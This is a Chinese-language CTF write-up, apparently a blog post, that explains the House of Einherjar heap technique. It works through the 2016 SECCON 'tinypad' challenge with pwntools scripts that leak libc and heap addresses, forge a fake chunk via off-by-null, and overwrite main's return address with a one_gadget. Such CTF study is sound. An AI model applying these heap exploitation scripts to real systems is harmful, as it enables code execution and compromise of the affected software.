---
title: House of Einherjar
date: '2025-03-18 14:57:41'
updated: '2025-04-07 21:39:55'
---
## 用途
可以强制使得 malloc 返回一个几乎任意地址的 chunk 

主要在于滥用 free 中的后向合并操作（合并低地址的 chunk）



第一次看 glibc 源码，在 malloc.c 里面的 malloc_consolidate 部分可以看到

2.23 版本：

![](/images/a93c252889c6a653402f772b0b254f56.png)

关于 prev_inuse 位的机制是这样的，只要 prev_inuse 为 0，就会直接取 prev_size 的大小向后合并成大 chunk

## 2016 Seccon tinypad
先是 checksec：

![](/images/80dbcb9036fb9bc6878034c33a225b7b.png)

Full RELRO 、有 canary 还有 NX，

IDA 看源代码看起来巨难受，有点难读，swtich；case 被换成全是 if，while，continue 之类的循环判断，不过慢慢看下来还是看得懂的

### 逆向过程
程序自己定义的 read 函数存在 off by null，溢出了一个空字节

![](/images/0be65b445d3062462738fc8a6d020bab.png)



在每次接受 cmd 之前，都会打印一次目前所有 chunk 的内容，但是打印方式比较特殊，先是用 strlen 获取长度再打印：

![](/images/788035cc008431913c1e98063c0ba595.png)

所以遇到有空字节就会结束打印



tinypad 是编辑 chunk 时的缓冲区，程序会先把输入放 tinypad，等到输入 y 确认之后才会把放在 tinypad 的内容拷贝到 chunk 里面

再看一下 tinypad+256 处的内存：

![](/images/f295f4a3d1c7f0d05852d46071dd783d.png)前 8 位放的是申请的堆的大小，后 8 位放的是堆的指针



再看到 free 函数相关的部分：

![](/images/2b1e7922457b24d6031eeb6285585afc.png)

清空的不是 free 掉的指针，清空的是堆块指针前面的堆块大小



而且还限制了 malloc 的最大 size 是 0x100（256）字节

![](/images/c425dbf2a0ac1cdc4b33a5b14a2d6886.png)



在 edit 的时候也用到了 strlen 来获取 chunk 内容的长度，所以没有办法通过把堆指针改成 hook 函数来修改 hook，因为 hook 被初始化为 0 了，可以编辑的长度为 0

![](/images/4910f969de8d9405d11238fc56ebe4e5.png)

#### 总结
1. 相当于每次操作都会 show 一遍所有的 chunk
2. 有 UAF
3. 有 off by null
4. edit 和 show 会被空字节截断（没法从 hook 下手）
5. 限制了 malloc 最大 0x100

先定义一些函数简化脚本：

```python
def add(size,content):
    link.recvuntil(b'(CMD)>>> ')
    link.sendline(b'A')
    link.recvuntil(b'(SIZE)>>> ')
    link.sendline(str(size))
    link.recvuntil(b'(CONTENT)>>> ')
    link.sendline(content)

def delete(index):
    link.recvuntil(b'(CMD)>>> ')
    link.sendline(b'D')
    link.recvuntil(b'(INDEX)>>> ')
    link.sendline(str(index))

def edit(index,content):
    link.recvuntil(b'(CMD)>>> ')
    link.sendline(b'E')
    link.recvuntil(b'(INDEX)>>> ')
    link.sendline(str(index))
    link.recvuntil(b'(CONTENT)>>> ')
    link.sendline(content)
    link.recvuntil(b'(Y/n)>>> ')
    link.sendline(b'y')
```

利用 UAF ，在 free 掉一个 unsortedchunk 之后泄露出了 libc 地址

```python
add(0x70,b'a'*0x70)
add(0x70,b'b'*0x70)
add(0x100,b'c'*0x100)
add(0x20,b'd'*0x20) #gap
delete(3)
addr=u64(link.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
print(hex(addr))
libc_base=addr-0x3c3b78
print('libc base='+hex(libc_base))
```

做到这里发现我 patch 的 glibc 小版本跟原题是不一样的，我动调调出来的偏移是不一样的，但是我找遍了都没找着题目`libc6_2.23-0ubuntu10`版本

不知道为啥吞拿站、阿里云、ubuntu 官方也都没有这个版本的 glibc...

估计是被删掉了，我看 `glibc-all-in-one`的演示下载的就是这个版本

但是一般题目就只会给 libc.so.6 ，找不到对应的 glibc 怎么办...

### 重点
看 WP 提醒了一个细节，堆的第一个 chunk 的地址最低位是 \x00，在这题不能用来泄露，会被截断，

所以上面先申请两个 fastchunk 的话，就得先释放 chunk2 再释放 chunk1，因为这样泄露出来的是 chunk2 的 fd，如果反过来泄露 chunk1 的 fd 就会被截断没法泄露出来

但是可以先申请 unsortedchunk，  
这样就完全不用考虑 fastchunk 的释放顺序：

```python
add(0x100,b'c'*0x8) #unsortedchunk
add(0x70,b'a'*0x8) #fastchunk1
add(0x70,b'b'*0x8) #fastchunk2
add(0x20,b'd'*0x8) #gap
delete(1)
libc_addr=u64(link.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
# print(hex(libc_addr))
libc_base=libc_addr-0x3c3b78
print('libc_base='+hex(libc_base))

gdb.attach(link,'set solib-search-path ~/FocusingCTF/glibc/2.23-0ubuntu3_amd64/')
pause()

delete(2)
delete(3)
link.recvuntil(b'INDEX: 3')
link.recvuntil(b'CONTENT: ')
heap_addr=u64(link.recvline().rstrip().ljust(8,b'\x00'))
# print(hex(heap_addr))
heap_base=heap_addr-0x110
print('heap_base='+hex(heap_base))
```

这下就把 libc 基址和堆基址（也就是第一个 chunk 的地址）泄露出来了

> 为什么要用到两个 fastchunk？
>
> 答：第一个进 fastbin 的 chunk 的 fd 是空的
>

可以只用三个 chunk 来泄露 libc 地址和堆地址：

```python
add(0x70,b'a'*0x8) #fastchunk1
add(0x70,b'b'*0x8) #fastchunk2
add(0x100,b'c'*0x8) #unsortedchunk

delete(2)
delete(1)
link.recvuntil(b'INDEX: 3')
link.recvuntil(b'CONTENT: ')
heap_addr=u64(link.recvline().rstrip().ljust(8,b'\x00'))
# print(hex(heap_addr))
heap_base=heap_addr-0x110
print('heap_base='+hex(heap_base))

delete(3)
libc_addr=u64(link.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
# print(hex(libc_addr))
libc_base=libc_addr-0x3c3b78
print('libc_base='+hex(libc_base))
```

### 补充
#### strcpy 的漏洞
`strcpy` 在遇到`\x00`空字节截断的时候会把这个空字节也拷贝过去



```python
add(0x18,b'a' * 0x18)
add(0x100,b'b' * 0xf8 +b'\x11')
add(0x100,b'c' * 0xf8)
add(0x100,b'd' * 0xf8)
```

这里的`\x11`的原因：

在后面覆盖 chunk2 的 prev_size 的时候，为了利用 off by null 修改 chunk2 的 prev_inuse 位，会把原本是 0x111 的 size 直接覆盖成 0x100，

如果不在 chunk3 里面伪造一个小 chunk，在检查 heap 的时候会出问题：

在原本 chunk2 的开头地址加上 size 偏移的地方并不是另外一个 chunk（接着 size 检查下去会出错）

其实就相当于把原来的 chunk2 拆成了两个 chunk，一个是被改后的 0x100 size ，一个是伪造的 0x11 size 的



```python
tinypad_addr = 0x602040
fakechunk_addr = tinypad_addr + 0x20
fakechunk_size = 0x101
fakechunk = p64(0)+p64(fakechunk_size)+p64(fakechunk_addr)+p64(fakechunk_addr)
edit(3,b'd'*0x20 + fakechunk)
```

利用 chunk3 在 tinypad 伪造 fakechunk



```python
diff = heap_base + 0x20 - fakechunk_addr
log.info('diff between idx1 and fakechunk: ' + hex(diff))
# '\0' padding caused by strcpy
diff_strip = p64(diff).strip(b'\0')
number_of_zeros = len(p64(diff)) - len(diff_strip)
for i in range(number_of_zeros + 1):
    data = diff_strip.rjust(0x18 - i,b'f')
    edit(1, data)
delete(2)
link.recvuntil(b'\nDeleted.')
```

用 fakechunk 跟 chunk2 地址的距离覆盖 chunk2 的 prev_size，这里用循环而不是直接`p64(diff)` 的原因：

1. 题目是用 strlen 从 chunk 里面获取可以编辑的长度的，所以原本申请 chunk 的第一次输入就把 chunk 用非空字节填满了，包括 chunk2 的 prev_size
2. 直接用`p64(diff)`的话，地址的确写进去了，但是第一：没处理掉本身 prev_size 这八个字节高地址的初始化非空字节，prev_size 是不对的；第二：因为 strcpy 遇到空字节会截断，传完地址就截断了，没有填满 prev_size 域从而利用 off by null 篡改 chunk2 的 prev_inuse 位
3. 其实可以前面几次可以不带地址，最后一次再把地址写进去，循环的目的是为了置空 chunk2 的 prev_size 高字节和 size 的低字节



```python
edit(4,b'd'*0x20+p64(0)+p64(0x101)+p64(main_arena+88)+p64(main_arena+88))
```

接着这一句不是恢复 fd 和 bk，而是为了保持 fd 和 bk 不变、恢复 fakechunk 的 size，因为在 house of einherjar 之后 free 完 chunk2 向前合并到 tinypad 的 fakechunk 的时候，会把 fakechunk 的 size 改成 chunk2 的 prev_size，再次申请的时候会报错`*** double free or corruption (!prev) ***`



接下来就是改 chunk 指针为 libc 中的 environ 地址，

往里面取一次值，通过动调算偏移从而获得 main 函数的返回地址

```python
fake_pad =b'f'*(0x100-0x20-0x10)+b'a'*8+p64(environ_pointer)+b'a'*8+p64(0x602148)
# get a fake chunk
add(0x100 - 8, fake_pad)

link.recvuntil(b' # CONTENT: ')
environ_addr = link.recvuntil(b'\n', drop=True).ljust(8,b'\x00')
environ_addr = u64(environ_addr)
main_ret_addr = environ_addr - 30 * 8
print(hex(main_ret_addr))

# set memo[0].content point to main_ret_addr
edit(2, p64(main_ret_addr))
# overwrite main_ret_addr with one_gadget addr
edit(1, p64(one_gadget_addr))
link.interactive()
```



最开始自己做的时候遇到了一点问题：

看每个 WP 的具体操作都不太一样，我上面泄露完 libc 地址和堆地址之后，再把全部 chunk free 掉之后刚准备开始跟着 WP 继续 stage2 house of einherjar 的时候却发现申请 chunk 的时候会报错...

泄露 libc 地址跟堆地址应该没有动到堆指针的啊...

> 莫名其妙放了一天不理之后又没有报错了...接着发力！
>

接着就是利用程序输入的流程（它先把输入的内容存在 tinypad 的位置，然后再用 strcpy 拷进 chunk 里面，所以输出会被零字节截断），在 tinypad 伪造一个 fakechunk，在 chunk2 释放的时候向前合并，让包含 tinypad 的 chunk 进入 unsortedbin 里面，后面再申请出来



可以执行到 onegadget 的 exp：（改了一下 CTFWiki 的 exp，可以执行到 onegadget 结果发现 2.23-0ubuntu3 版本下 onegadget 打不通...）

在申请到位于 tinypad 的 fakechunk 之后，只要不再申请或者释放（不动堆的东西），就可以随意使用 edit 函数来修改 main 函数的返回地址，不用在乎 edit 的时候 tinypad 上面 fakechunk 被覆盖，可以利用这个来写 rop 链来 getshell

```python
#!/usr/bin/env python3

from pwn import *

link = process("./tinypad")
libc = ELF('./glibc/2.23-0ubuntu3_amd64/libc.so.6')
main_arena_offset = 0x3c3b20

def add(size, content):
    link.recvuntil(b'(CMD)>>> ')
    link.sendline(b'a')
    link.recvuntil(b'(SIZE)>>> ')
    link.sendline(str(size))
    link.recvuntil(b'(CONTENT)>>> ')
    link.sendline(content)

def edit(idx, content):
    link.recvuntil(b'(CMD)>>> ')
    link.sendline(b'e')
    link.recvuntil(b'(INDEX)>>> ')
    link.sendline(str(idx))
    link.recvuntil(b'(CONTENT)>>> ')
    link.sendline(content)
    link.recvuntil(b'Is it OK?\n')
    link.sendline(b'Y')

def delete(idx):
    link.recvuntil(b'(CMD)>>> ')
    link.sendline(b'd')
    link.recvuntil(b'(INDEX)>>> ')
    link.sendline(str(idx))

ogg=[0x4526a,0xf02a4,0xf1147]  

link.recvuntil(
    '  ============================================================================\n\n'
)
gdb.attach(link,'set solib-search-path ~/FocusingCTF/glibc/2.23-0ubuntu3_amd64/')
pause()

# 1. leak heap base
add(0x70,b'a' * 8)  # idx 0
add(0x70,b'b' * 8)  # idx 1
add(0x100,b'c' * 8)  # idx 2

delete(2)  # delete idx 1
delete(1)  # delete idx 0, idx 0 point to idx 1
link.recvuntil(b' # CONTENT: ')
data = link.recvuntil(b'\n', drop=True)  # get pointer point to idx1
heap_base = u64(data.ljust(8,b'\x00')) - 0x80
log.success('get heap base: ' + hex(heap_base))

# 2. leak libc base
# this will trigger malloc_consolidate
# first idx0 will go to unsorted bin
# second idx1 will merge with idx0(unlink), and point to idx0
# third idx1 will merge into top chunk
# but cause unlink feture, the idx0's fd and bk won't change
# so idx0 will leak the unsorted bin addr
delete(3)
link.recvuntil(' # CONTENT: ')
data = link.recvuntil('\n', drop=True)
unsorted_offset_arena = 8 + 10 * 8
main_arena = u64(data.ljust(8,b'\x00')) - unsorted_offset_arena 
libc_base = main_arena - main_arena_offset
log.success('main_arena addr: ' + hex(main_arena))
log.success('libc_base addr: ' + hex(libc_base))

# 从这里开始，后面的就因为一直各种报错没做出来...

# 3. house of einherjar
add(0x18,b'a' * 0x18)  # idx 0
# we would like trigger house of einherjar at idx 1
add(0x100,b'b' * 0xf8 +b'\x11')  # idx 1
add(0x100,b'c' * 0xf8)  # idx 2
add(0x100,b'd' * 0xf8)  #idx 3

# create a fake chunk in tinypad's 0x100 buffer, offset 0x20
tinypad_addr = 0x602040
fakechunk_addr = tinypad_addr + 0x20
fakechunk_size = 0x101
fakechunk = p64(0)+p64(fakechunk_size)+p64(fakechunk_addr)+p64(fakechunk_addr)
edit(3,b'd'*0x20 + fakechunk)

#overwrite idx 1's prev_size and
# set minaddr of size to '\x00'
# idx 0's chunk size is 0x20
diff = heap_base + 0x20 - fakechunk_addr
log.info('diff between idx1 and fakechunk: ' + hex(diff))
# '\0' padding caused by strcpy
diff_strip = p64(diff).strip(b'\0')
number_of_zeros = len(p64(diff)) - len(diff_strip)
for i in range(number_of_zeros + 1): 
    data = diff_strip.rjust(0x18 - i,b'f')
    edit(1, data)
delete(2)
link.recvuntil(b'\nDeleted.')

# fix the fake chunk size, fd and bk
# fd and bk must be unsorted bin
edit(4,b'd'*0x20+p64(0)+p64(0x101)+p64(main_arena+88)+p64(main_arena+88))

# 3. overwrite malloc_hook with one_gadget
one_gadget_addr = libc_base + ogg[1]
environ_pointer = libc_base + libc.symbols['__environ']
log.info('one gadget addr: ' + hex(one_gadget_addr))
log.info('environ pointer addr: ' + hex(environ_pointer))
#fake_malloc_chunk = main_arena - 60 + 9
# set memo[0].size = 'a'*8,
# set memo[0].content point to environ to leak environ addr
fake_pad =b'f'*(0x100-0x20-0x10)+b'a'*8+p64(environ_pointer)+b'a'*8+p64(0x602148)
# get a fake chunk
add(0x100 - 8, fake_pad)  # idx 2
#gdb.attach(p)

# get environ addr
link.recvuntil(b' # CONTENT: ')
environ_addr = link.recvuntil(b'\n', drop=True).ljust(8,b'\x00')
environ_addr = u64(environ_addr)
main_ret_addr = environ_addr - 30 * 8
print(hex(main_ret_addr))

# set memo[0].content point to main_ret_addr
edit(2, p64(main_ret_addr))
# overwrite main_ret_addr with one_gadget addr
edit(1, p64(one_gadget_addr))

# gdb.attach(p,'set solib-search-path ~/FocusingCTF/glibc/2.23-0ubuntu3_amd64/')
# pause()

link.interactive()
```

### 拓展：__environ
通过 libc 找到的符号 symbol：`__environ`

利用 libc 基址算出来`__environ`的地址，往里面取指针，指向的地方跟 main 函数的返回地址很近，偏移是固定的

可以利用这个点来获取到 main 函数的返回地址，从而修改程序流

![](/images/4326e140df3ce26b7190f0d4f26b58eb.png)

